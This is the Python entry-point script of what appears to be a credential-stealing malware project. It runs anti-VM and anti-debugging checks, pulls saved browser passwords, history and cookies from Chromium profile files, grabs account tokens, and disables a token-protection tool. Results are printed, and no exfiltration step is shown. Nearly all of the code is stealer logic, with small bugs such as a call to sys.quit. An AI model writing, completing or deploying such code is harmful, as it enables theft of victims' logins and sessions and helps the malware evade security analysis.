from core import extractor
from core import antivm
from core import sysinfo
from core import tokengrabber

from threading import Thread

import os
import sys

class Main:
    def __init__(self) -> None:
        pass

    def antivm(self):
        if antivm.Antivm.run():
            sys.quit()
        
        antivm.AntiDebug.checks()
        
    def browser(self):
        for key in extractor.browsers:
            browser = extractor.browsers[key]

            if os.path.exists(browser):
                extraction = extractor.Extract(os.path.join(browser, "Local State"))
                passwds = extraction.extractPasswords(os.path.join(browser, "Login Data"))
                history = extraction.extractHistory(os.path.join(browser, "History"))
                cookies = extraction.extractCookies(os.path.join(browser))
                print(cookies)


    def steam(self):
        pass

    def token(self):
        tokens = tokengrabber.extract_tokens().tokens
        print(tokens)
        extractor.Anti_tokenprotector.killprotector()

    def run(self):
        antivm.Antivm.run()
        antivm.Antidbg.proc_check()
        antivm.Antidbg.dll_check()

        t1 = Thread(target=antivm.Antidbg.process_check)
        t1.start()

        self.browser()
        self.token()

        sys.exit()

if __name__ == "__main__":
    Main().run()